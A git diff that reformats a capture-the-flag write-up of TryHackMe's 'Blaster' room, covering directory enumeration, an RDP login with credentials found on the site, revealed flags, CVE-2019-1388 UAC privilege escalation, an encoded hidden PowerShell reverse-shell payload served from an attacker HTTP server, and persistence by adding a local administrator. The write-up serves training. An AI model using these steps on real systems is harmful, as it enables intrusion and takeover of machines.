@@ -1,11 +1,12 @@
 # Blaster
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+
+![tryhackme.com - © TryHackMe](<../../learn/.gitbook/assets/tryhackme-logo-small (2).png>)
 
 > 🔬🌐 [Blaster](https://tryhackme.com/room/blaster)
 >
-> *Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster.*
+> _Throughout this room, we'll be looking at alternative modes of exploitation without the use of Metasploit or really exploitation tools in general beyond nmap and dirbuster._
 >
-> ![](.gitbook/assets/blaster.png)
+> <img src=".gitbook/assets/blaster.png" alt="" data-size="original">
 
 🎯 Target IP: `10.10.27.22`
 
@@ -63,12 +64,10 @@ gobuster dir -u http://10.10.27.22 -w /usr/share/wordlists/dirbuster/directory-l
 
 Navigate to
 
-
-- `http://10.10.27.22/Retro/`
-- `http://10.10.27.22/retro/index.php/2019/12/09/ready-player-one/`
+* `http://10.10.27.22/Retro/`
+* `http://10.10.27.22/retro/index.php/2019/12/09/ready-player-one/`
 
 > 📌 `Wade`:`parzival`
->
 
 ```bash
 xfreerdp /u:Wade /p:parzival /v:10.10.27.22
@@ -78,30 +77,25 @@ xfreerdp /u:Wade /p:parzival /v:10.10.27.22
 
 Read **`user.txt`** file.
 
-
-
 <details>
+
 <summary>Reveal Flag - user.txt: 🚩</summary>
 
-
-
 `THM{HACK_PLAYER_ONE}`
-
-
 
 </details>
 
 ### Local Recon
+
 Check Internet Explorer history.
 
-- `CVE-2019-1388` - Windows Privilege Escalation Through UAC
-- `hhupd.exe` on desktop
+* `CVE-2019-1388` - Windows Privilege Escalation Through UAC
+* `hhupd.exe` on desktop
 
 ## Privilege Escalation
 
-- Run `hhupd.exe` to exploit the privilege escalation vulnerability present in the Windows Certificate Dialog box, a bug in the UAC mechanism
-  - `cmd` user: `nt authority\system`
-
+* Run `hhupd.exe` to exploit the privilege escalation vulnerability present in the Windows Certificate Dialog box, a bug in the UAC mechanism
+  * `cmd` user: `nt authority\system`
 
 ![](.gitbook/assets/certuacbypass.gif)
 
@@ -110,17 +104,13 @@ cd c:\Users\Administrator\Desktop
 type root.txt
 ```
 
-
-
 <details>
+
 <summary>Reveal Flag - root.txt: 🚩</summary>
-
-
-
 
 `THM{COIN_OPERATED_EXPLOITATION}`
 
-![](.gitbook/assets/image-20230510180611161.png)
+<img src=".gitbook/assets/image-20230510180611161.png" alt="" data-size="original">
 
 </details>
 
@@ -140,9 +130,8 @@ set LPORT 9090
 run -j
 ```
 
-- Run the following command on the target machine
-  - copy it in a file and host the file on a Python http server
-
+* Run the following command on the target machine
+  * copy it in a file and host the file on a Python http server
 
 ```bash
 nano payload
@@ -154,11 +143,10 @@ powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0
 python -m http.server
 ```
 
-- Open the link on the target machine
-  - `http://10.18.65.48:8000/payload`
-
-- Copy the code and paste it in the opened `CMD`
-- Check the spawned reverse shell in Metasploit
+* Open the link on the target machine
+  * `http://10.18.65.48:8000/payload`
+* Copy the code and paste it in the opened `CMD`
+* Check the spawned reverse shell in Metasploit
 
 ![](.gitbook/assets/image-20230510181844027.png)
 
@@ -204,11 +192,11 @@ set LPORT 4444
 run
 ```
 
-- *Windows Defender blocked the persistence service payload in this case*
+* _Windows Defender blocked the persistence service payload in this case_
 
 ![](.gitbook/assets/image-20230510190355420.png)
 
-- Add a new user instead and give it administrative privileges
+* Add a new user instead and give it administrative privileges
 
 ```bash
 net user syselement pwd12345 /add
@@ -218,5 +206,4 @@ net localgroup "Administrators" syselement /add
 net localgroup "Administrators"
 ```
 
-------
-
+***
